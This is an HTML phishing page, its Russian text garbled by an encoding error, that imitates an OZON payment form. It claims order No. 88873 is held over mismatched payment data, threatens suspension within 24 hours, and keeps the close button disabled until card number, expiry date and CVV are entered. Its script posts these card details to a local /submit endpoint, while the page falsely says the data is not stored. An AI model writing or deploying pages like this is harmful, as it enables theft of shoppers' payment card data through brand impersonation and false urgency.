<!DOCTYPE html>
<html lang="kk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OZON - –§–æ—Ä–º–∞ –æ–ø–ª–∞—Ç—ã</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="background"></div>
    <div class="payment-window" id="paymentWindow">
        <h2>–ó–∞–¥–µ—Ä–∂–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –∑–∞–∫–∞–∑–∞!</h2>
        <p>–£–≤–∞–∂–∞–µ–º—ã–π –∫–ª–∏–µ–Ω—Ç,</p>
        <p>–í–∞—à –∑–∞–∫–∞–∑ <strong>‚Ññ88873</strong> –≤—Ä–µ–º–µ–Ω–Ω–æ –∑–∞–¥–µ—Ä–∂–∞–Ω –Ω–∞ —Å–∫–ª–∞–¥–µ –∏–∑-–∑–∞ –Ω–µ—Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–∏—è –ø–ª–∞—Ç–µ–∂–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö.
            –î–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –∏ —É—Å–∫–æ—Ä–µ–Ω–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏, –ø–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–≤—Ç–æ—Ä–Ω–æ –≤–≤–µ–¥–∏—Ç–µ –¥–∞–Ω–Ω—ã–µ –≤–∞—à–µ–π –∫–∞—Ä—Ç—ã.</p>
        <p><strong>–í–∞—à –∑–∞–∫–∞–∑ –±—É–¥–µ—Ç –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω, –µ—Å–ª–∏ –¥–∞–Ω–Ω—ã–µ –Ω–µ –±—É–¥—É—Ç –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω—ã –≤ —Ç–µ—á–µ–Ω–∏–µ 24 —á–∞—Å–æ–≤.</strong></p>
        <form id="paymentForm">
            <label for="card-number">–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã</label>
            <input type="text" id="card-number" placeholder="–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã" required pattern="\d{16}" title="–í–≤–µ–¥–∏—Ç–µ 16 —Ü–∏—Ñ—Ä">
            <label for="expiry-date">–°—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è</label>
            <input type="text" id="expiry-date" placeholder="–ú–ú/–ì–ì" required pattern="(0[1-9]|1[0-2])\/\d{2}" title="–í–≤–µ–¥–∏—Ç–µ –¥–∞—Ç—É –≤ —Ñ–æ—Ä–º–∞—Ç–µ MM/YY">
            <label for="cvv">CVV</label>
            <input type="text" id="cvv" placeholder="CVV" required pattern="\d{3}" title="–í–≤–µ–¥–∏—Ç–µ 3 —Ü–∏—Ñ—Ä—ã">
            <button type="submit">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
        </form>

        <p class="security-message">üîí –í —Ü–µ–ª—è—Ö –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –¥–∞–Ω–Ω—ã–µ –Ω–µ —Å–æ—Ö—Ä–∞–Ω—è—é—Ç—Å—è –∏ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è —Ç–æ–ª—å–∫–æ –¥–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –∑–∞–∫–∞–∑–∞.</p>
        <button class="close-btn" onclick="closePaymentWindow()" disabled id="closeBtn">–ó–∞–∫—Ä—ã—Ç—å</button>
    </div>
    <script>
        function validateForm() {
            const cardNumber = document.getElementById('card-number').value;
            const expiryDate = document.getElementById('expiry-date').value;
            const cvv = document.getElementById('cvv').value;
            const closeBtn = document.getElementById('closeBtn');

            if (cardNumber.length === 16 && expiryDate.match(/(0[1-9]|1[0-2])\/\d{2}/) && cvv.length === 3) {
                closeBtn.disabled = false;
            } else {
                closeBtn.disabled = true;
            }
        }
        document.getElementById('paymentForm').addEventListener('input', validateForm);
        function closePaymentWindow() {
            document.getElementById('paymentWindow').style.display = 'none';
        }
        document.getElementById("paymentForm").addEventListener("submit", function(event) {
            event.preventDefault();
            const cardNumber = document.getElementById('card-number').value;
            const expiryDate = document.getElementById('expiry-date').value;
            const cvv = document.getElementById('cvv').value;
            const data = {
                card_number: cardNumber,
                expiration: expiryDate,
                cvv: cvv
            };
            fetch('http://localhost:8000/submit', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
                alert('–î–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã!');
                closePaymentWindow();
            })
            .catch((error) => {
                console.error('Error:', error);
                alert('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –¥–∞–Ω–Ω—ã—Ö');
            });
        });
    </script>
</body>
</html>
